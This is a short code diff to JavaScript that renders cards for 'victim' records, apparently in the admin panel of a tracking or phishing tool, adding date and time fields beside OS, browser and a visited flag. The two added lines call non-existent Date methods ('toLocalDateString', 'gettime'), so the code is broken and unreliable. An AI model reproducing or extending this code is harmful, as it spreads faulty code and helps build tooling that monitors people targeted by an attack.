@@ -119,6 +119,8 @@
 					var os=victim["os"]?victim["os"]:"Not Known";
 					var browser=victim["browser"]?victim["browser"]:"Not Known";
 					var isvisited=victim["isvisited"];
+					var date=new Date(victim["date"]).toLocalDateString();
+					var time=new Date(victim["date"]).gettime();
 
 
 					cards.innerHTML+='\
@@ -139,6 +141,8 @@
 										<li class="list_item">Type:<span class="value">'+type+'</span></li>\
 										<li class="list_item">os:<span class="value">'+os+'</span></li>\
 										<li class="list_item">browser:<span class="value">'+browser+'</span></li>\
+										<li class="list_item">date:<span class="value">'+date+'</span></li>\
+										<li class="list_item">time:<span class="value">'+time+'</span></li>\
 										<li class="list_item">Isvisited:<span class="value">'+isvisited+'</span></li>\
 									</ol>\
 									<div class="footer">\
